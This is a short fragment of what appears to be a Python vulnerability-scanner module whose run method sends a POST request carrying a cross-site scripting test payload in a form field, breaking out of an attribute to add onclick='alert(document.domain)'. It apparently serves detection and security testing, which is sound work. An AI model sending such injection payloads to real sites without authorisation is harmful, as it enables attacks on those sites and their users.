...
class Module(Scanner, Http_client):
    ...
    def run(self):
        ...
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="settingsform[lastname]=pdteam'+onclick='alert(document.domain)\n")
